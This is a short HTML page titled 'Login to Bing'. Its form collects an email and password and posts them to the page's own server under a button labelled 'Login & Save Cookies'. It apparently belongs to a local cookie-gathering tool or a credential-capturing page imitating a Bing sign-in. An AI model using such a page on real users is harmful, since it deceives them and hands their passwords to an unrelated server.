<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login to Bing</title>
</head>
<body>
    <h2>Login to Your Bing Account</h2>
    <form action="/" method="POST">
        <label>Email:</label>
        <input type="text" name="email" required>
        <br>
        <label>Password:</label>
        <input type="password" name="password" required>
        <br>
        <button type="submit">Login & Save Cookies</button>
    </form>
</body>
</html>
